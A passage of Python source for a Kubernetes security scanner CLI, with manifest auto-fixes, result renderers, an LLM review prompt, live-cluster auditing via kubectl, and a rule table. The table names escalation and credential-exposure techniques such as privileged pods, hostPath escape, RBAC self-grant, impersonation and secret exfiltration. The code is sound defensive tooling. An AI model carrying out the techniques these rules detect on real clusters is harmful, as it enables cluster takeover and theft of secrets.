    doc  = copy.deepcopy(doc)
    labels = doc.setdefault("metadata", {}).setdefault("labels", {})
    if not labels.get("pod-security.kubernetes.io/enforce") or \
       labels.get("pod-security.kubernetes.io/enforce") == "privileged":
        labels["pod-security.kubernetes.io/enforce"] = "restricted"
        labels["pod-security.kubernetes.io/audit"]   = "restricted"
        labels["pod-security.kubernetes.io/warn"]    = "restricted"
    return doc

def _dump_yaml(obj) -> str:
    raw   = yaml.dump(obj, default_flow_style=False, allow_unicode=True, sort_keys=False)
    lines = []
    note_pat = re.compile(r"^(\s*)_note:\s*(.+)$")
    for line in raw.splitlines():
        m = note_pat.match(line)
        if m:
            indent, note = m.group(1), m.group(2).strip("'\"")
            lines.append(f"{indent}# {note}")
        else:
            lines.append(line)
    return "\n".join(lines)

def apply_fixes(content: str) -> str:
    parts = re.split(r"^---\s*$", content, flags=re.MULTILINE)
    out   = []
    for part in parts:
        part = part.strip()
        if not part: continue
        try:
            doc = yaml.safe_load(part)
        except yaml.YAMLError:
            out.append(part); continue
        if not isinstance(doc, dict):
            out.append(part); continue
        kind = doc.get("kind", "")
        if kind in ("Pod","Deployment","DaemonSet","StatefulSet","Job","CronJob","ReplicaSet"):
            doc = _fix_workload(doc)
        elif kind == "Service":       doc = _fix_service(doc)
        elif kind in ("Role","ClusterRole"): doc = _fix_rbac_role(doc)
        elif kind == "Namespace":     doc = _fix_namespace(doc)
        out.append(_dump_yaml(doc))
    return "\n---\n".join(out) + "\n"

def compute_diff(original: str, patched: str, filename: str) -> str:
    return "".join(difflib.unified_diff(
        original.splitlines(keepends=True),
        patched.splitlines(keepends=True),
        fromfile=f"a/{filename}", tofile=f"b/{filename}",
    ))


# ─────────────────────────────────────────────────────────────
# RENDERERS
# ─────────────────────────────────────────────────────────────
def render_banner():
    console.print()
    console.print(Panel.fit(
        f"[bold white]SpotterSec[/bold white] [dim]v{VERSION} —[/dim] [bold green]K8s Security Scanner[/bold green]\n"
        "[dim]Find it. Understand it. Know how to exploit it.[/dim]",
        border_style="dim green", padding=(0, 2),
    ))
    console.print()


def render_finding_compact(f: Finding):
    cfg = SEV[f.severity]
    console.print(
        f"  [{cfg['color']}]{cfg['icon']} {f.severity:<8}[/{cfg['color']}]"
        f" [bold white]{f.title}[/bold white]  [dim][{f.rule_id}][/dim]"
    )
    if f.line_num:
        console.print(f"           [dim]Line {f.line_num}:[/dim] [dim cyan]{f.line_content or ''}[/dim cyan]")


def render_finding_full(f: Finding):
    cfg = SEV[f.severity]
    console.print()
    console.print(Rule(style="dim"))
    sev_badge = Text()
    sev_badge.append(f" {cfg['icon']} {f.severity} ", style=f"bold on {cfg['bar']}")
    console.print(sev_badge, f"[bold white]{f.title}[/bold white]", f"[dim]({f.rule_id})[/dim]")
    console.print()
    console.print(f"  [dim]{textwrap.fill(f.description, 88)}[/dim]")
    if f.context_lines:
        console.print()
        for ln, text, is_target in f.context_lines:
            if is_target:
                console.print(f"  [bold red]→[/bold red] [dim]{ln:4}[/dim]  [bold yellow]{text}[/bold yellow]")
            else:
                console.print(f"    [dim]{ln:4}  {text}[/dim]")
    console.print()
    console.print("  [dim]Attack chain:[/dim]")
    for i, step in enumerate(f.attack_chain, 1):
        console.print(f"  [dim]  {i}.[/dim] [dim]{step}[/dim]")
    if f.fix_snippet:
        console.print()
        console.print("  [dim]Fix:[/dim]")
        console.print(Padding(Syntax(f.fix_snippet.rstrip(), "yaml",
            theme="monokai", line_numbers=False, background_color="default"), (0, 4)))
    if f.scenario_url:
        console.print(f"  [dim]↗ Learn more:[/dim] [blue underline]{f.scenario_url}[/blue underline]")


def render_results_grouped(findings, filename, explain=False, risk=None):
    """Render findings grouped by resource (kind/name)."""
    counts = {s: sum(1 for f in findings if f.severity == s) for s in SEV}
    console.print(f"\n[bold white]Scanning:[/bold white] [cyan]{filename}[/cyan]")

    if not findings:
        console.print(Panel("[bold green]✓ No issues found[/bold green]\n[dim]Clean against all built-in rules.[/dim]",
                            border_style="green", padding=(0, 1)))
        return

    parts = [f"[{SEV[s]['color']}]{counts[s]} {s}[/{SEV[s]['color']}]"
             for s in ("CRITICAL","HIGH","MEDIUM","LOW") if counts[s]]
    console.print(f"  {' · '.join(parts)}  [dim]({len(findings)} findings)[/dim]")
    if risk:
        render_risk_score(risk)
    console.print()

    # Group by resource_key
    groups: dict[str, list[Finding]] = {}
    for f in findings:
        key = f.resource_key or "(cluster-level)"
        groups.setdefault(key, []).append(f)

    for rkey, group_findings in groups.items():
        worst_sev = min(SEV_ORDER.get(f.severity, 5) for f in group_findings)
        worst_cfg = SEV[list(SEV_ORDER.keys())[worst_sev]]
        console.print(f"  [{worst_cfg['color']}]▶[/{worst_cfg['color']}] [bold]{rkey}[/bold]"
                      f"  [dim]({len(group_findings)} finding{'s' if len(group_findings)!=1 else ''})[/dim]")
        if explain:
            for f in group_findings:
                render_finding_full(f)
        else:
            for f in group_findings:
                render_finding_compact(f)
        console.print()

    if not explain:
        console.print("  [dim]Run with [bold]--explain[/bold] to see attack chains, code context, and fixes[/dim]")

    console.print()
    if counts["CRITICAL"] > 0:
        console.print(f"  [bold red]RESULT: {counts['CRITICAL']} CRITICAL — immediate action required[/bold red]")
    elif counts["HIGH"] > 0:
        console.print(f"  [bold yellow]RESULT: {counts['HIGH']} HIGH — address before production[/bold yellow]")
    elif counts["MEDIUM"] > 0:
        console.print(f"  [bold cyan]RESULT: {counts['MEDIUM']} MEDIUM — review recommended[/bold cyan]")
    else:
        console.print(f"  [bold green]RESULT: Low severity findings only — good posture[/bold green]")


def render_results(findings, filename, explain=False, risk=None, group=False):
    if group:
        render_results_grouped(findings, filename, explain=explain, risk=risk)
        return
    counts = {s: sum(1 for f in findings if f.severity == s) for s in SEV}
    console.print(f"\n[bold white]Scanning:[/bold white] [cyan]{filename}[/cyan]")
    if not findings:
        console.print(Panel("[bold green]✓ No issues found[/bold green]\n[dim]Clean against all built-in rules.[/dim]",
                            border_style="green", padding=(0, 1)))
        return
    parts = [f"[{SEV[s]['color']}]{counts[s]} {s}[/{SEV[s]['color']}]"
             for s in ("CRITICAL","HIGH","MEDIUM","LOW") if counts[s]]
    console.print(f"  {' · '.join(parts)}  [dim]({len(findings)} findings)[/dim]")
    if risk: render_risk_score(risk)
    console.print()
    if explain:
        for f in findings: render_finding_full(f)
        console.print(); console.print(Rule(style="dim"))
    else:
        for f in findings: render_finding_compact(f)
        console.print()
        console.print("  [dim]Run with [bold]--explain[/bold] to see attack chains, code context, and fixes[/dim]")
    console.print()
    if counts["CRITICAL"] > 0:
        console.print(f"  [bold red]RESULT: {counts['CRITICAL']} CRITICAL — immediate action required[/bold red]")
    elif counts["HIGH"] > 0:
        console.print(f"  [bold yellow]RESULT: {counts['HIGH']} HIGH — address before production[/bold yellow]")
    elif counts["MEDIUM"] > 0:
        console.print(f"  [bold cyan]RESULT: {counts['MEDIUM']} MEDIUM — review recommended[/bold cyan]")
    else:
        console.print(f"  [bold green]RESULT: Low severity findings only — good posture[/bold green]")


def render_json_output(all_results, include_fix=False, all_contents=None, all_risks=None):
    out = {}
    for filename, findings in all_results.items():
        entry = {"findings": [{
            "rule_id": f.rule_id, "severity": f.severity, "title": f.title,
            "description": f.description, "attack_chain": f.attack_chain,
            "fix_snippet": f.fix_snippet, "line_num": f.line_num,
            "yaml_path": f.yaml_path, "scenario_url": f.scenario_url,
            "doc_index": f.doc_index, "resource_key": f.resource_key,
        } for f in findings]}
        if all_risks and filename in all_risks:
            r = all_risks[filename]
            entry["risk"] = {"score": r["score"], "grade": r["grade"],
                             "label": r["label"], "explanation": r["explanation"],
                             "combinations": [{"description": d, "bonus": b}
                                              for d, b in r.get("combos", [])]}
        if include_fix and all_contents and filename in all_contents:
            entry["patched_yaml"] = apply_fixes(all_contents[filename])
        out[filename] = entry
    print(json.dumps(out, indent=2))


def render_sarif_output(all_results):
    rules, results = {}, []
    for filename, findings in all_results.items():
        for f in findings:
            if f.rule_id not in rules:
                rules[f.rule_id] = {
                    "id": f.rule_id, "name": f.rule_id,
                    "shortDescription": {"text": f.title},
                    "fullDescription": {"text": f.description},
                    "helpUri": f.scenario_url or "",
                    "defaultConfiguration": {"level": {"CRITICAL":"error","HIGH":"error",
                                                        "MEDIUM":"warning","LOW":"note"}.get(f.severity,"note")},
                }
            loc = {}
            if f.line_num:
                loc = {"physicalLocation": {"artifactLocation": {"uri": filename},
                                             "region": {"startLine": f.line_num}}}
            results.append({
                "ruleId": f.rule_id,
                "level": {"CRITICAL":"error","HIGH":"error","MEDIUM":"warning","LOW":"note"}.get(f.severity,"note"),
                "message": {"text": f.title},
                "locations": [loc] if loc else [],
            })
    sarif = {"version": "2.1.0",
             "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
             "runs": [{"tool": {"driver": {"name": "SpotterSec", "version": VERSION,
                                           "informationUri": "https://spottersec.com",
                                           "rules": list(rules.values())}},
                       "results": results}]}
    print(json.dumps(sarif, indent=2))


def render_trend(baseline: dict, current: dict):
    """Compare two JSON scan outputs and show delta."""
    console.print()
    console.print(Rule(title="[dim]Trend — Baseline vs Current[/dim]", style="dim"))
    all_files = sorted(set(list(baseline.keys()) + list(current.keys())))
    for fname in all_files:
        b_findings = {f["rule_id"]+str(f.get("line_num") or "") for f in baseline.get(fname, {}).get("findings", [])}
        c_findings = {f["rule_id"]+str(f.get("line_num") or "") for f in current.get(fname, {}).get("findings", [])}
        new_issues   = c_findings - b_findings
        fixed_issues = b_findings - c_findings
        b_risk = baseline.get(fname, {}).get("risk", {}).get("score", 0)
        c_risk = current.get(fname, {}).get("risk", {}).get("score", 0)
        delta  = c_risk - b_risk
        arrow  = ("↑" if delta > 0 else "↓" if delta < 0 else "→")
        color  = ("red" if delta > 0 else "green" if delta < 0 else "dim")
        console.print(f"\n  [bold]{fname}[/bold]")
        console.print(f"    Risk: {b_risk} → {c_risk}  [{color}]{arrow} {delta:+d}[/{color}]")
        if fixed_issues:
            console.print(f"    [green]✓ Fixed:[/green] {', '.join(sorted(fixed_issues))}")
        if new_issues:
            console.print(f"    [red]✗ New:[/red]   {', '.join(sorted(new_issues))}")
        if not new_issues and not fixed_issues:
            console.print("    [dim]No change[/dim]")


# ─────────────────────────────────────────────────────────────
# LLM
# ─────────────────────────────────────────────────────────────
def llm_enhance(findings, yaml_content, provider, llm_url, llm_model,
                api_key=None, debug=False) -> str:
    import urllib.request
    summary = "\n".join(
        f"- [{f.severity}] {f.rule_id}: {f.title} (line {f.line_num})"
        for f in findings
    ) or "(none)"
    prompt = (
        "You are a Kubernetes security expert for the SpotterSec learning platform.\n\n"
        f"Static analysis found:\n{summary}\n\n"
        f"YAML (first 3000 chars):\n```yaml\n{yaml_content[:3000]}\n```\n\n"
        "1. Identify additional issues the static scanner may have missed\n"
        "2. Per finding: severity, title, 2-3 sentences on attack impact\n"
        "3. Note real breach patterns where recognisable\n"
        "4. Comment on combined risk — which findings amplify each other\n\n"
        "Be concise, attacker-focused, plain text."
    )
    if provider == "anthropic":
        payload = json.dumps({
            "model": llm_model or "claude-haiku-4-5-20251001",
            "max_tokens": 800,
            "messages": [{"role": "user", "content": prompt}]
        }).encode()
        req = urllib.request.Request(
            llm_url or "https://api.anthropic.com/v1/messages",
            data=payload,
            headers={"Content-Type": "application/json",
                     "x-api-key": api_key or os.environ.get("ANTHROPIC_API_KEY", ""),
                     "anthropic-version": "2023-06-01"},
            method="POST",
        )
    else:
        payload = json.dumps({
            "model": llm_model or "qwen2.5-coder:7b",
            "messages": [{"role": "user", "content": prompt}],
            "stream": False,
        }).encode()
        req = urllib.request.Request(
            (llm_url or "http://localhost:11434") + "/v1/chat/completions",
            data=payload, headers={"Content-Type": "application/json"}, method="POST",
        )
    if debug:
        console.print(f"[dim]DEBUG → {req.full_url} model={llm_model}[/dim]")
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            data = json.loads(resp.read())
        if provider == "anthropic":
            return data.get("content", [{}])[0].get("text", "")
        return data.get("choices", [{}])[0].get("message", {}).get("content", "")
    except Exception as e:
        return f"[LLM error: {e}]"


# ─────────────────────────────────────────────────────────────
# CLI — RULE METADATA
# ─────────────────────────────────────────────────────────────
RULE_META = [
    ("SC001",    "CRITICAL", "privileged: true",                                      "privileged-pod"),
    ("VOL001",   "CRITICAL", "hostPath on dangerous path",                            "hostpath-escape"),
    ("CAP001_*", "CRITICAL", "Dangerous capability (SYS_ADMIN, SYS_MODULE, ...)",     "privileged-pod"),
    ("RBAC001",  "CRITICAL", "cluster-admin bound to subject",                        "dashboard-chain"),
    ("RBAC006",  "CRITICAL", "ClusterRole verbs:[*] resources:[*] apiGroups:[*]",     "wildcard-rbac"),
    ("RBAC008",  "CRITICAL", "Role can write RBAC bindings — self-grant escalation",  "wildcard-rbac"),
    ("RBAC009",  "CRITICAL", "Role grants impersonation",                             "wildcard-rbac"),
    ("ETCD001",  "CRITICAL", "etcd on HTTP (no TLS)",                                 "etcd-exposure"),
    ("ETCD002",  "CRITICAL", "etcd bound to 0.0.0.0",                                "etcd-exposure"),
    ("WHK001",   "HIGH",     "Admission webhook failurePolicy:Ignore",                "supply-chain"),
    ("NS001",    "HIGH",     "hostPID: true",                                         "privileged-pod"),
    ("NS002",    "HIGH",     "hostNetwork: true",                                     "privileged-pod"),
    ("NS010",    "HIGH",     "Namespace missing Pod Security Admission enforce label", "wildcard-rbac"),
    ("NS011",    "HIGH",     "Namespace PSA enforce level is 'privileged'",           "wildcard-rbac"),
    ("SC002",    "HIGH",     "runAsUser: 0 (explicit root)",                          "privileged-pod"),
    ("SC003",    "HIGH",     "runAsNonRoot: false",                                   "privileged-pod"),
    ("SC005",    "HIGH",     "allowPrivilegeEscalation: true",                        "privileged-pod"),
    ("RBAC002",  "HIGH",     "Wildcard verbs [*] on pod/secret resources",            "wildcard-rbac"),
    ("RBAC003",  "HIGH",     "Wildcard resources [*]",                                "wildcard-rbac"),
    ("RBAC004",  "HIGH",     "Role grants Secrets read access",                       "etcd-exposure"),
    ("RBAC005",  "HIGH",     "Binding to built-in 'admin'/'edit' role",               "wildcard-rbac"),
    ("RBAC007",  "HIGH",     "Role can create/modify pods — escalation path",         "wildcard-rbac"),
    ("SVC002",   "HIGH",     "externalIPs set — CVE-2020-8554 traffic interception",  "ssrf-metadata"),
    ("ENV001",   "HIGH",     "Hardcoded credential in container env var",             "secrets-exfil"),
    ("ENV002",   "HIGH",     "Credential stored in ConfigMap (should be Secret)",     "secrets-exfil"),
    ("ENV003",   "CRITICAL", "Known secret pattern detected in env var",              "secrets-exfil"),
    ("ENV004",   "CRITICAL", "Known secret pattern detected in ConfigMap",            "secrets-exfil"),
    ("HLM001",   "HIGH",     "Hardcoded secret in Helm values.yaml",                  "secrets-exfil"),
    ("HLM002",   "HIGH",     "Helm chart auth.enabled: false",                        "etcd-exposure"),
    ("PDB001",   "MEDIUM",   "Single replica — availability attack surface",          ""),
    ("NET002",   "MEDIUM",   "NetworkPolicy catch-all ingress (allows all sources)",  "ssrf-metadata"),
    ("NET003",   "MEDIUM",   "NetworkPolicy has no Egress restriction",               "ssrf-metadata"),
    ("NS003",    "MEDIUM",   "hostIPC: true",                                         "privileged-pod"),
    ("CAP002",   "MEDIUM",   "capabilities.drop: [ALL] missing",                      "privileged-pod"),
    ("SC004",    "MEDIUM",   "runAsNonRoot not set — may run as root silently",       "privileged-pod"),
    ("SA001",    "MEDIUM",   "SA token auto-mounted unnecessarily",                   "dashboard-chain"),
    ("SA002",    "MEDIUM",   "Uses 'default' ServiceAccount",                         "dashboard-chain"),
    ("SVC001",   "MEDIUM",   "Service type LoadBalancer (public IP)",                 "dashboard-chain"),
    ("ETCD003",  "MEDIUM",   "Secrets encryption at rest not configured",             "etcd-exposure"),
    ("NET001",   "MEDIUM",   "No NetworkPolicy — east-west movement unrestricted",    "ssrf-metadata"),
    ("ING001",   "MEDIUM",   "Ingress host has no TLS",                              "ssrf-metadata"),
    ("ING002",   "MEDIUM",   "Ingress wildcard/missing host",                         "dashboard-chain"),
    ("WHK002",   "LOW",      "Admission webhook high timeout (latency risk)",         ""),
    ("WHK003",   "LOW",      "Admission webhook intercepts all resources",            ""),
    ("PDB002",   "LOW",      "No PodDisruptionBudget — eviction risk",               ""),
    ("SC006",    "LOW",      "allowPrivilegeEscalation not set (defaults to true)",   "privileged-pod"),
    ("SC007",    "LOW",      "readOnlyRootFilesystem not set",                        "privileged-pod"),
    ("SC008",    "LOW",      "No seccomp profile — all syscalls allowed",             "privileged-pod"),
    ("IMG001",   "LOW",      "Mutable image tag (:latest or no digest)",              "supply-chain"),
    ("RES001",   "LOW",      "No resource limits",                                    "dashboard-chain"),
    ("SVC003",   "LOW",      "Service type NodePort",                                 "dashboard-chain"),
    ("ING003",   "LOW",      "Ingress has no authentication annotation",              "dashboard-chain"),
]


# ─────────────────────────────────────────────────────────────
# CONFIG FILE
# ─────────────────────────────────────────────────────────────
def load_config() -> dict:
    candidates = [
        Path(".spottersec.yaml"), Path(".spottersec.yml"),
        Path.home() / ".spottersec" / "config.yaml",
        Path.home() / ".spottersec" / "config.yml",
    ]
    for path in candidates:
        if path.exists():
            try:
                cfg = yaml.safe_load(path.read_text()) or {}
                if isinstance(cfg, dict): return cfg
            except Exception:
                pass
    return {}


def apply_config_defaults(args, config: dict):
    scan_cfg = config.get("scan", {}) or {}
    if not args.fail_on and scan_cfg.get("fail_on"):
        args.fail_on = str(scan_cfg["fail_on"]).lower()
    if not args.severity and scan_cfg.get("severity"):
        args.severity = str(scan_cfg["severity"]).lower()
    if not args.ignore and scan_cfg.get("ignore"):
        ignore_list = scan_cfg["ignore"]
        if isinstance(ignore_list, list):
            args.ignore = ",".join(str(x) for x in ignore_list)
    if args.provider == "static" and config.get("provider"):
        args.provider = str(config["provider"]).lower()
    llm_cfg = config.get("llm", {}) or {}
    if not args.llm_model and llm_cfg.get("model"):
        args.llm_model = str(llm_cfg["model"])
    if not args.llm_url and llm_cfg.get("url"):
        args.llm_url = str(llm_cfg["url"])
    scan_paths = scan_cfg.get("paths", [])
    if scan_paths and args.paths == []:
        args.paths = [str(p) for p in scan_paths]
    return args


# ─────────────────────────────────────────────────────────────
# CMD: rules
# ─────────────────────────────────────────────────────────────
def cmd_rules(args):
    render_banner()
    tbl = Table(box=box.SIMPLE, show_header=True, header_style="bold dim")
    tbl.add_column("Rule ID",  style="cyan",     width=13)
    tbl.add_column("Severity", width=10)
    tbl.add_column("Title",    style="white",    width=55)
    tbl.add_column("Scenario", style="dim blue", width=28)
    sev_filter = args.severity.upper() if args.severity else None
    for rid, sev, title, scenario in sorted(RULE_META, key=lambda x: SEV_ORDER.get(x[1], 5)):
        if sev_filter and SEV_ORDER.get(sev,5) > SEV_ORDER.get(sev_filter,5):
            continue
        cfg = SEV.get(sev, SEV["LOW"])
        url = f"spottersec.com/#scenario/{scenario}" if scenario else ""
        tbl.add_row(rid, f"[{cfg['color']}]{sev}[/{cfg['color']}]", title, url)
    console.print(tbl)
    console.print(f"\n  [dim]{len(RULE_META)} rules total[/dim]")


# ─────────────────────────────────────────────────────────────
# CMD: scan
# ─────────────────────────────────────────────────────────────
def cmd_scan(args):
    config = load_config()
    args   = apply_config_defaults(args, config)

    want_fix   = args.fix or args.patch
    want_diff  = args.diff
    want_write = args.write_fix
    show_risk  = not args.no_risk
    group_by   = args.group

    inputs = []
    for path_str in args.paths:
        if path_str == "-":
            inputs.append(("<stdin>", sys.stdin.read(), None))
        else:
            path = Path(path_str)
            if path.is_dir():
                for fp in sorted(path.rglob("*.yaml")) + sorted(path.rglob("*.yml")):
                    inputs.append((str(fp), fp.read_text(encoding="utf-8", errors="replace"), fp))
            elif path.is_file():
                inputs.append((str(path), path.read_text(encoding="utf-8", errors="replace"), path))
            else:
                console.print(f"[red]Not found: {path_str}[/red]")

    if not inputs:
        console.print("[red]No YAML input found.[/red]"); sys.exit(1)

    ignore_rules = {r.strip().upper() for r in args.ignore.split(",")} if args.ignore else set()
    sev_map      = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    min_sev      = sev_map.get((args.severity or "").lower(), 4)

    all_results, all_risks, all_contents, all_flat = {}, {}, {}, []

    if args.output == "table":
        render_banner()

    for label, content, filepath in inputs:
        findings = scan_yaml_string(content, label)
        findings = [f for f in findings
                    if f.rule_id not in ignore_rules
                    and f.rule_id.split("_")[0] not in ignore_rules]
        findings = [f for f in findings if sev_map.get(f.severity.lower(), 4) <= min_sev]
        risk     = compute_risk_score(findings) if show_risk else None

        if args.output == "table":
            if want_fix or want_diff or want_write:
                patched = apply_fixes(content)
                if want_diff:
                    diff = compute_diff(content, patched, label)
                    if diff:
                        console.print(f"\n[bold]Diff — {label}:[/bold]")
                        console.print(Syntax(diff, "diff", theme="monokai",
                                             background_color="default", line_numbers=False))
                    else:
                        console.print(f"\n[dim]{label}: no auto-fixable changes[/dim]")
                elif want_write and filepath:
                    filepath.write_text(patched, encoding="utf-8")
                    console.print(f"[green]✓ Wrote patched YAML → {label}[/green]")
                    render_results(findings, label, explain=args.explain, risk=risk, group=group_by)
                else:
                    console.print(f"\n[bold]Patched YAML — {label}:[/bold]\n")
                    console.print(Syntax(patched, "yaml", theme="monokai",
                                         line_numbers=True, background_color="default"))
            else:
                render_results(findings, label, explain=args.explain, risk=risk, group=group_by)
                if args.provider != "static":
                    console.print(f"\n  [dim]Running {args.provider} analysis...[/dim]")
                    llm_out = llm_enhance(findings, content, provider=args.provider,
                                          llm_url=args.llm_url or args.api_url,
                                          llm_model=args.llm_model,
                                          api_key=args.api_key, debug=args.debug)
                    if llm_out:
                        console.print()
                        console.print(Panel(llm_out,
                            title=f"[dim]{args.provider.upper()} Analysis[/dim]",
                            border_style="dim blue", padding=(0, 2)))

        all_results[label]  = findings
        all_risks[label]    = risk or {}
        all_contents[label] = content
        all_flat.extend(findings)

    if args.output == "json":
        render_json_output(all_results, include_fix=(want_fix or want_diff),
                           all_contents=all_contents, all_risks=all_risks)
    elif args.output == "sarif":
        render_sarif_output(all_results)

    # Trend comparison
    if args.baseline and args.output == "json":
        try:
            baseline_data = json.loads(Path(args.baseline).read_text())
            current_data  = json.loads(sys.stdout.getvalue() if hasattr(sys.stdout, 'getvalue') else '{}')
            render_trend(baseline_data, {label: {"findings": [vars(f) for f in fs],
                                                  "risk": all_risks.get(label, {})}
                                          for label, fs in all_results.items()})
        except Exception as e:
            console.print(f"[yellow]Trend compare error: {e}[/yellow]")

    # Multi-file summary
    if len(inputs) > 1 and args.output == "table":
        console.print(); console.print(Rule(title="[dim]Summary[/dim]", style="dim"))
        counts = {s: sum(1 for f in all_flat if f.severity == s) for s in SEV}
        parts  = [f"[{SEV[s]['color']}]{counts[s]} {s}[/{SEV[s]['color']}]"
                  for s in ("CRITICAL","HIGH","MEDIUM","LOW") if counts[s]]
        console.print(f"  {len(inputs)} file(s) · "
                      f"{' · '.join(parts) if parts else '[green]All clean[/green]'} · "
                      f"{len(all_flat)} total findings")
        if show_risk and all_flat:
            render_risk_score(compute_risk_score(all_flat))

    if args.fail_on:
        threshold = sev_map.get(args.fail_on.lower(), 4)
        if any(sev_map.get(f.severity.lower(), 4) <= threshold for f in all_flat):
            sys.exit(1)


# ─────────────────────────────────────────────────────────────
# CMD: fix --apply  (interactive patch approval)
# ─────────────────────────────────────────────────────────────
def cmd_fix(args):
    render_banner()
    config = load_config()
    # re-use scan args shape
    ignore_rules = set()
    sev_map = {"critical": 0, "high": 1, "medium": 2, "low": 3}

    inputs = []
    for path_str in args.paths:
        path = Path(path_str)
        if path.is_dir():
            for fp in sorted(path.rglob("*.yaml")) + sorted(path.rglob("*.yml")):
                inputs.append((str(fp), fp.read_text(encoding="utf-8", errors="replace"), fp))
        elif path.is_file():
            inputs.append((str(path), path.read_text(encoding="utf-8", errors="replace"), path))

    if not inputs:
        console.print("[red]No YAML files found.[/red]"); sys.exit(1)

    total_fixed = 0
    for label, content, filepath in inputs:
        findings = scan_yaml_string(content, label)
        if not findings:
            console.print(f"[green]✓ {label} — no issues[/green]")
            continue

        patched = apply_fixes(content)
        diff    = compute_diff(content, patched, label)
        if not diff.strip():
            console.print(f"[dim]{label} — no auto-fixable changes[/dim]")
            render_results(findings, label, explain=False)
            continue

        console.print(f"\n[bold cyan]═══ {label} ═══[/bold cyan]")
        risk = compute_risk_score(findings)
        render_results(findings, label, explain=False, risk=risk, group=True)
        console.print()
        console.print("[bold]Proposed changes:[/bold]")
        console.print(Syntax(diff, "diff", theme="monokai",
                             background_color="default", line_numbers=False))
        console.print()

        if args.yes:
            apply_it = True
        else:
            apply_it = Confirm.ask(f"Apply fixes to [cyan]{label}[/cyan]?", default=False)

        if apply_it and filepath:
            filepath.write_text(patched, encoding="utf-8")
            console.print(f"[green]✓ Patched → {label}[/green]")
            total_fixed += 1
        else:
            console.print(f"[dim]Skipped {label}[/dim]")

    console.print()
    console.print(f"[bold]Done.[/bold] {total_fixed} file(s) patched.")


# ─────────────────────────────────────────────────────────────
# CMD: audit  (live cluster via kubectl)
# ─────────────────────────────────────────────────────────────
def cmd_audit(args):
    import subprocess
    render_banner()

    # Each entry: (resource_type, cluster_scoped)
    # Cluster-scoped resources must NOT use -n / -A
    ALL_RESOURCES = [
        ("clusterrolebindings",              True),
        ("clusterroles",                     True),
        ("namespaces",                       True),
        ("validatingwebhookconfigurations",  True),
        ("mutatingwebhookconfigurations",    True),
        ("pods",                             False),
        ("deployments",                      False),
        ("daemonsets",                       False),
        ("statefulsets",                     False),
        ("jobs",                             False),
        ("cronjobs",                         False),
        ("rolebindings",                     False),
        ("roles",                            False),
        ("services",                         False),
        ("ingresses",                        False),
        ("configmaps",                       False),
        ("networkpolicies",                  False),
        ("poddisruptionbudgets",             False),
    ]

    if args.resources:
        requested = {r.strip() for r in args.resources.split(",")}
        fetch_list = [(r, cs) for r, cs in ALL_RESOURCES if r in requested]
        # Add any requested that aren't in our known list as namespaced
        known = {r for r, _ in ALL_RESOURCES}
        for r in requested:
            if r not in known:
                fetch_list.append((r, False))
    else:
        fetch_list = ALL_RESOURCES

    ns_flag = ["-n", args.namespace] if args.namespace else ["-A"]

    yaml_parts = []
    errors     = []
    total      = len(fetch_list)

    for idx, (resource, cluster_scoped) in enumerate(fetch_list, 1):
        flags = [] if cluster_scoped else ns_flag
        scope = "cluster" if cluster_scoped else (args.namespace or "all-ns")
        console.print(f"[dim]  [{idx}/{total}] {resource} ({scope})[/dim]")
        try:
            result = subprocess.run(
                ["kubectl", "get", resource] + flags + ["-o", "yaml"],
                capture_output=True, text=True, timeout=20,
            )
            if result.stdout.strip():
                yaml_parts.append(result.stdout)
            if result.returncode != 0 and result.stderr.strip():
                msg = result.stderr.strip().splitlines()[0]
                # Suppress benign errors
                if not any(x in msg for x in ("No resources found", "no objects passed",
                                               "doesn't have a resource type",
                                               "the server doesn't have")):
                    errors.append(f"{resource}: {msg}")
        except FileNotFoundError:
            console.print("[red]kubectl not found. Install kubectl and ensure it's in your PATH.[/red]")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            errors.append(f"{resource}: timed out")

    if errors:
        console.print()
        for e in errors[:5]:
            console.print(f"  [yellow dim]⚠ {e}[/yellow dim]")
        if len(errors) > 5:
            console.print(f"  [yellow dim]⚠ ... and {len(errors)-5} more[/yellow dim]")

    if not yaml_parts:
        console.print("\n[yellow]No resources returned from cluster.[/yellow]")
        return

    console.print()
    yaml_content = "\n---\n".join(yaml_parts)

    findings = scan_yaml_string(yaml_content, "<live-cluster>")

    # Suppress stale line numbers — they point into the combined kubectl blob, not real files
    for f in findings:
        f.line_num     = None
        f.line_content = None
        f.context_lines = []

    # Apply filters
    ignore_rules = {r.strip().upper() for r in args.ignore.split(",")} if args.ignore else set()
    sev_map      = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    min_sev      = sev_map.get((args.severity or "").lower(), 4)
    findings = [f for f in findings
                if f.rule_id not in ignore_rules
                and f.rule_id.split("_")[0] not in ignore_rules
                and sev_map.get(f.severity.lower(), 4) <= min_sev]

    # --skip-system-roles: suppress RBAC findings on built-in k8s system roles
    if getattr(args, "skip_system_roles", False):
        findings = [f for f in findings if not _is_system_role(f.resource_key)]

    risk = compute_risk_score(findings)
    render_results(findings, "live cluster", explain=args.explain, risk=risk, group=True)

    if getattr(args, "interactive", False):
        console.print("\n  [dim]Launching interactive TUI...[/dim]\n")
        _tui_browse(findings)

    if args.output == "json":
        render_json_output({"live-cluster": findings}, all_risks={"live-cluster": risk})
    elif args.output == "sarif":
        render_sarif_output({"live-cluster": findings})

    if args.fail_on:
        threshold = sev_map.get(args.fail_on.lower(), 4)
        if any(sev_map.get(f.severity.lower(), 4) <= threshold for f in findings):
            sys.exit(1)




# ─────────────────────────────────────────────────────────────
# SYSTEM ROLE SUPPRESSION
# ─────────────────────────────────────────────────────────────
SYSTEM_ROLE_PREFIXES = (
    "system:controller:",
    "system:kube-",
    "system:aggregate-to-",
    "system:node",
    "system:public-info-viewer",
    "system:monitoring",
)
SYSTEM_ROLE_EXACT = {"cluster-admin", "admin", "edit", "view"}

def _is_system_role(resource_key: str) -> bool:
    parts = resource_key.split("/")
    kind  = parts[0] if parts else ""
    name  = parts[-1] if parts else ""
    if kind not in ("ClusterRole", "ClusterRoleBinding", "Role", "RoleBinding"):
        return False
    return (any(name.startswith(p) for p in SYSTEM_ROLE_PREFIXES)
            or name in SYSTEM_ROLE_EXACT)


# ─────────────────────────────────────────────────────────────
# CLUSTER GRAPH  (shared by attack + blast-radius)
# ─────────────────────────────────────────────────────────────

def _fetch_cluster_graph(namespace=None):
    import subprocess
    import yaml as _yaml

    GRAPH_RESOURCES = [
        ("clusterrolebindings",  True),
        ("clusterroles",         True),
        ("namespaces",           True),
        ("pods",                 False),
        ("deployments",          False),
